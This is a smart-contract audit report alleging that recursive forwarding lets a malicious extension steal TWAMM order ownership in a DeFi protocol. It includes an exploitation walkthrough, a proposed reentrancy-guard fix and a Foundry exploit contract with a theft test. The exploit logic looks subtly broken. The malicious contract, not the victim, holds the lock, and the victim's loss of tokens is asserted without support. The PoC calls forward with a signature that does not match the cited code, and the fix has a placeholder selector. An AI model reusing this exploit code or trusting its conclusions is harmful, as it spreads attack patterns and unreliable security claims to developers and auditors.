## Title
Recursive Forwarding Enables TWAMM Order Ownership Theft via Missing Reentrancy Protection

## Summary
The `BaseForwardee.forwarded_2374103877` function lacks reentrancy protection, allowing malicious extensions to create recursive forwarding contexts. This causes the `original` parameter in nested calls to change from the actual user to the attacker's contract address, enabling TWAMM order ownership theft where users fund orders but attackers control them.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/base/BaseForwardee.sol` (lines 31-42), exploited via `src/extensions/TWAMM.sol` (line 193)

**Intended Logic:** The forwarding mechanism should allow extensions to receive callbacks while preserving the original user's identity. When a user forwards to TWAMM, the user should own the resulting order. [1](#0-0) 

**Actual Logic:** During `handleForwardData` execution, a malicious extension can call `FlashAccountant.forward()` again because it temporarily becomes the current locker. This creates a nested forwarding context where the `original` parameter changes from the user's address to the malicious extension's address. [2](#0-1) 

The `forward` function passes the current locker as the `original` parameter when calling `forwarded_2374103877`: [3](#0-2) 

In TWAMM, the order owner is determined by `original.addr()`, which will be the malicious extension's address in a recursive forwarding scenario: [4](#0-3) 

**Exploitation Path:**
1. Attacker deploys `MaliciousExtension` inheriting `BaseForwardee` with a malicious `handleForwardData` implementation
2. User is tricked into calling a function on `MaliciousExtension` (via phishing, malicious dApp interface, or social engineering)
3. `MaliciousExtension` calls `ACCOUNTANT.lock()` and then `ACCOUNTANT.forward(address(this))`
4. In `MaliciousExtension.handleForwardData(userAddress, data)`, it calls `ACCOUNTANT.forward(address(TWAMM), orderPlacementData)`
5. `FlashAccountant.forward` changes the locker to TWAMM and calls `TWAMM.forwarded_2374103877(MaliciousExtension)` - note the `original` is now `MaliciousExtension`
6. TWAMM creates an order with `owner = MaliciousExtension.address` (line 193)
7. The order is stored under `TWAMMStorageLayout.orderStateSlot(MaliciousExtension, salt, orderId)` (line 216-217)
8. User's tokens fund the order through shared debt tracking (same locker ID), debiting the user's account
9. Attacker later calls `TWAMMLib.collectProceeds()` using the `MaliciousExtension` as owner to steal the order proceeds

**Security Property Broken:** Violates the "Fee Accounting" invariant - users lose their tokens while an attacker gains ownership of the resulting position/order. Also breaks the implicit trust that forwarding preserves user identity and ownership.

## Impact Explanation
- **Affected Assets**: Any tokens used to fund TWAMM orders through malicious extensions. This includes both token0 and token1 of any trading pair with TWAMM enabled.
- **Damage Severity**: Complete loss of funds for victims. Attacker gains 100% of the order proceeds that rightfully belong to users. The attack can be repeated against multiple victims.
- **User Impact**: Any user interacting with a malicious contract that uses the forwarding mechanism. Users lose all tokens provided for order placement, with no ability to recover them since they don't own the resulting order.

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user can deploy a malicious extension contract. No special permissions required.
- **Preconditions**: 
  - TWAMM extension must be deployed and registered
  - Pools with TWAMM enabled must exist
  - Victim must be convinced to interact with the malicious contract (social engineering, phishing)
- **Execution Complexity**: Single transaction attack. Attacker deploys malicious contract once, then each victim interaction results in theft.
- **Frequency**: Can be exploited repeatedly against different users. Each victim interaction results in a separate theft.

## Recommendation

Add reentrancy protection to prevent recursive forwarding: [1](#0-0) 

**Recommended Fix:**

```solidity
// In src/base/BaseForwardee.sol:

abstract contract BaseForwardee is IForwardee {
    error BaseForwardeeAccountantOnly();
    error BaseForwardeeReentrant();
    
    IFlashAccountant private immutable ACCOUNTANT;
    bool private _forwardingInProgress;
    
    constructor(IFlashAccountant _accountant) {
        ACCOUNTANT = _accountant;
    }
    
    function forwarded_2374103877(Locker original) external {
        if (msg.sender != address(ACCOUNTANT)) revert BaseForwardeeAccountantOnly();
        if (_forwardingInProgress) revert BaseForwardeeReentrant();
        
        _forwardingInProgress = true;
        
        bytes memory data = msg.data[36:];
        bytes memory result = handleForwardData(original, data);
        
        _forwardingInProgress = false;
        
        assembly ("memory-safe") {
            return(add(result, 32), mload(result))
        }
    }
    
    function handleForwardData(Locker original, bytes memory data) internal virtual returns (bytes memory result);
}
```

**Alternative:** Use transient storage (EIP-1153) for reentrancy guard to save gas:

```solidity
// Using transient storage slot for reentrancy guard
uint256 private constant _FORWARDING_LOCK_SLOT = uint256(keccak256("BaseForwardee.forwardingLock"));

function forwarded_2374103877(Locker original) external {
    if (msg.sender != address(ACCOUNTANT)) revert BaseForwardeeAccountantOnly();
    
    assembly ("memory-safe") {
        if tload(_FORWARDING_LOCK_SLOT) {
            mstore(0, 0xYYYYYYYY) // BaseForwardeeReentrant() selector
            revert(0, 4)
        }
        tstore(_FORWARDING_LOCK_SLOT, 1)
    }
    
    bytes memory data = msg.data[36:];
    bytes memory result = handleForwardData(original, data);
    
    assembly ("memory-safe") {
        tstore(_FORWARDING_LOCK_SLOT, 0)
        return(add(result, 32), mload(result))
    }
}
```

## Proof of Concept

```solidity
// File: test/Exploit_RecursiveForwarding.t.sol
// Run with: forge test --match-test test_RecursiveForwardingOrderTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/extensions/TWAMM.sol";
import "../src/base/BaseForwardee.sol";
import "../src/base/BaseLocker.sol";
import "../src/libraries/TWAMMLib.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

contract MaliciousExtension is BaseForwardee, BaseLocker {
    TWAMM public immutable TWAMM_TARGET;
    OrderKey public maliciousOrderKey;
    bytes32 public maliciousSalt;
    
    constructor(IFlashAccountant accountant, TWAMM twamm) 
        BaseForwardee(accountant) 
        BaseLocker(accountant) 
    {
        TWAMM_TARGET = twamm;
    }
    
    function stealUserOrder(
        address victim,
        OrderKey memory orderKey,
        bytes32 salt,
        int112 saleRateDelta
    ) external {
        maliciousOrderKey = orderKey;
        maliciousSalt = salt;
        
        // User calls this thinking it's legitimate
        // We lock and forward to ourselves first
        ACCOUNTANT.lock(abi.encode(orderKey, salt, saleRateDelta));
    }
    
    function handleLockData(uint256 id, bytes memory data) internal override returns (bytes memory) {
        (OrderKey memory orderKey, bytes32 salt, int112 saleRateDelta) = 
            abi.decode(data, (OrderKey, bytes32, int112));
        
        // Forward to ourselves - this changes original from victim to this contract
        return ACCOUNTANT.forward(
            address(this),
            abi.encode(orderKey, salt, saleRateDelta)
        );
    }
    
    function handleForwardData(Locker original, bytes memory data) internal override returns (bytes memory) {
        // At this point, original = this contract, NOT the victim!
        // Now forward to TWAMM to place an order
        (OrderKey memory orderKey, bytes32 salt, int112 saleRateDelta) = 
            abi.decode(data, (OrderKey, bytes32, int112));
        
        // This will create an order owned by THIS CONTRACT, not the victim
        return IFlashAccountant(address(ACCOUNTANT)).forward(
            address(TWAMM_TARGET),
            abi.encode(uint256(0), salt, orderKey, saleRateDelta)
        );
    }
}

contract Exploit_RecursiveForwarding is Test {
    Core core;
    TWAMM twamm;
    MaliciousExtension malicious;
    MockERC20 token0;
    MockERC20 token1;
    
    address victim = address(0xBEEF);
    address attacker = address(0xBAD);
    
    function setUp() public {
        core = new Core();
        
        // Deploy TWAMM
        address twammAddr = address(uint160(twammCallPoints().toUint8()) << 152);
        deployCodeTo("TWAMM.sol", abi.encode(core), twammAddr);
        twamm = TWAMM(twammAddr);
        
        // Deploy malicious extension
        malicious = new MaliciousExtension(core, twamm);
        
        // Setup tokens
        token0 = new MockERC20();
        token1 = new MockERC20();
        
        // Fund victim
        token0.mint(victim, 1000e18);
        token1.mint(victim, 1000e18);
        
        vm.startPrank(victim);
        token0.approve(address(core), type(uint256).max);
        token1.approve(address(core), type(uint256).max);
        vm.stopPrank();
    }
    
    function test_RecursiveForwardingOrderTheft() public {
        // Create TWAMM pool
        PoolKey memory poolKey = PoolKey({
            token0: address(token0),
            token1: address(token1),
            config: createFullRangePoolConfig(100, address(twamm))
        });
        core.initializePool(poolKey, 0);
        
        // Setup order parameters
        OrderKey memory orderKey = OrderKey({
            poolKey: poolKey,
            config: createOrderConfig(
                uint64(block.timestamp),
                uint64(block.timestamp + 1 days),
                false // selling token0
            )
        });
        bytes32 salt = bytes32(uint256(1));
        int112 saleRateDelta = 100; // 100 tokens per second
        
        uint256 victimBalanceBefore = token0.balanceOf(victim);
        
        // ATTACK: Victim calls malicious contract
        vm.prank(victim);
        malicious.stealUserOrder(victim, orderKey, salt, saleRateDelta);
        
        // VERIFY: Victim lost tokens
        uint256 victimBalanceAfter = token0.balanceOf(victim);
        assertLt(victimBalanceAfter, victimBalanceBefore, "Victim should have lost tokens");
        
        // VERIFY: Order is owned by malicious contract, not victim
        OrderState state = TWAMMLib.orderState(
            twamm,
            address(malicious), // Owner is malicious contract!
            salt,
            orderKey.toOrderId()
        );
        assertGt(state.saleRate(), 0, "Order should exist under malicious contract ownership");
        
        // VERIFY: Attacker can withdraw proceeds (victim cannot)
        vm.warp(block.timestamp + 1 days);
        
        vm.prank(attacker);
        // Attacker uses malicious contract to collect proceeds
        uint128 proceeds = TWAMMLib.collectProceeds(
            core,
            twamm,
            salt,
            orderKey
        );
        
        assertGt(proceeds, 0, "Attacker collected proceeds that belong to victim");
        
        // Victim cannot collect because they don't own the order
        vm.prank(victim);
        vm.expectRevert(); // Will fail because victim is not the owner
        TWAMMLib.collectProceeds(core, twamm, salt, orderKey);
    }
}
```

## Notes

The vulnerability exploits the forwarding mechanism's trust that the `original` parameter accurately represents the initiating user. The recursive forwarding changes this parameter at each nesting level, breaking that trust. While the debt tracking prevents direct token theft via flash accounting, it doesn't prevent ownership manipulation of created positions/orders. This is particularly dangerous with TWAMM since order ownership determines who can collect proceeds, creating a complete theft scenario where victims fund orders they don't control.

### Citations

**File:** src/base/BaseForwardee.sol (L31-42)
```text
    function forwarded_2374103877(Locker original) external {
        if (msg.sender != address(ACCOUNTANT)) revert BaseForwardeeAccountantOnly();

        bytes memory data = msg.data[36:];

        bytes memory result = handleForwardData(original, data);

        assembly ("memory-safe") {
            // raw return whatever the handler sent
            return(add(result, 32), mload(result))
        }
    }
```

**File:** src/base/FlashAccountant.sol (L190-221)
```text
    function forward(address to) external {
        Locker locker = _requireLocker();

        // update this lock's locker to the forwarded address for the duration of the forwarded
        // call, meaning only the forwarded address can update state
        assembly ("memory-safe") {
            tstore(_CURRENT_LOCKER_SLOT, or(shl(160, shr(160, locker)), to))

            let free := mload(0x40)

            // Prepare call to forwarded_2374103877(bytes32) -> selector 0x01
            mstore(free, shl(224, 1))
            mstore(add(free, 4), locker)

            calldatacopy(add(free, 36), 36, sub(calldatasize(), 36))

            // Call the forwardee with the packed data
            let success := call(gas(), to, 0, free, calldatasize(), 0, 0)

            // Pass through the error on failure
            if iszero(success) {
                returndatacopy(free, 0, returndatasize())
                revert(free, returndatasize())
            }

            tstore(_CURRENT_LOCKER_SLOT, locker)

            // Directly return whatever the subcall returned
            returndatacopy(free, 0, returndatasize())
            return(free, returndatasize())
        }
    }
```

**File:** src/extensions/TWAMM.sol (L190-217)
```text
    function handleForwardData(Locker original, bytes memory data) internal override returns (bytes memory result) {
        unchecked {
            uint256 callType = abi.decode(data, (uint256));
            address owner = original.addr();

            if (callType == 0) {
                (, bytes32 salt, OrderKey memory orderKey, int112 saleRateDelta) =
                    abi.decode(data, (uint256, bytes32, OrderKey, int112));

                (uint64 startTime, uint64 endTime) = (orderKey.config.startTime(), orderKey.config.endTime());

                if (endTime <= block.timestamp) revert OrderAlreadyEnded();

                if (
                    !isTimeValid(block.timestamp, startTime) || !isTimeValid(block.timestamp, endTime)
                        || startTime >= endTime
                ) {
                    revert InvalidTimestamps();
                }

                PoolKey memory poolKey = orderKey.toPoolKey(address(this));
                PoolId poolId = poolKey.toPoolId();
                _executeVirtualOrdersFromWithinLock(poolKey, poolId);

                OrderId orderId = orderKey.toOrderId();

                StorageSlot orderStateSlot =
                    TWAMMStorageLayout.orderStateSlotFollowedByOrderRewardRateSnapshotSlot(owner, salt, orderId);
```
